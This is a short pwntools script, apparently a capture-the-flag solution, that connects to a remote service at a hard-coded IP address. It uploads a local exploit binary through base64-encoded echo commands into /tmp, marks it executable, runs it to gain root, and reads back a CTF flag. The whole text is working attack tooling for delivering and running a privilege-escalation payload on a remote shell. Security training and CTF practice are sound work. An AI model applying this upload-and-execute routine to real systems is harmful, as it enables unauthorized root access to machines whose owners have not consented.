
from pwn import *

host = '102.220.29.203'
port = 4100
exploit_path = './exploit'
chunk_size = 512

conn = remote(host, port)


exploit = open(exploit_path, 'rb').read()


with log.progress('Uploading exploit...') as p:
  for i in range(0, len(exploit), chunk_size):
    c = b64e(exploit[i:i+chunk_size])
    conn.sendlineafter('$', 'echo %s | base64 -d >> /tmp/p' % c)
    p.status(f'{100 * i // len(exploit)}%')


with log.progress('Getting root....') as p:
  conn.sendlineafter('$ ', 'cd /tmp')
  conn.sendlineafter('$ ', 'chmod +x ./p')
  conn.sendlineafter('$ ', './p')
  print(conn.recvregex(r'CTF{.*}'))


exit(0)
